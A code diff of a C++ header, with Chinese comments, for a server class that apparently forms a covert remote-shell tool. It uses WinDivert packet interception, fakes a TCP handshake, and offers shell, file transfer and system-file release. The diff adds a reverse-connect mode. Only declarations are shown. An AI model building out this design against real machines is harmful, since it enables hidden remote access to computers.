@@ -30,11 +30,18 @@ private:
 	PROCESS_INFORMATION m_proc_info;
 	UINT m_thread_id;
 	bool m_use_crypt;
+	bool m_reverse_mode = false;
+	DWORD m_client_port;
+	UINT32 m_src_addr;
+	UINT32 m_dst_addr;
+	UINT16 m_src_port;
+	UINT16 m_dst_port;
 
 public:
 	CServer();
 	~CServer();
 	void start();
+	void set_reverse_mode(bool mode);
 
 private:
 	void set_packet_template(PVOID packet, UINT recv_len);								// 格式化标准发送包
@@ -43,7 +50,7 @@ private:
 	void send_data_packet(const char* payload_buf, int payload_len = 0);				// 发送数据包
 	BOOL init_divert(const char* filter);												// 初始化windivert
 	void run_shell();																	// 打开shell
-	void init_shell();
+	void init_shell();																	
 	void exit_shell();																	// 退出shell
 	void add_seq(UINT seq);																// 添加标准包的seq
 	void send_connect_reponse(PVOID packet, UINT recv_len);								// 模拟tcp三次握手
@@ -56,4 +63,8 @@ private:
 	void download_file(string download_str);
 	void upload_file(string upload_str);
 	bool release_sysfile();
+	bool connect_to_target();
+	void build_packet_template();
+	void build_addr_template();
+	bool init_reverse_mode(string dst_addr, string src_addr, int dst_port, int src_port);
 };
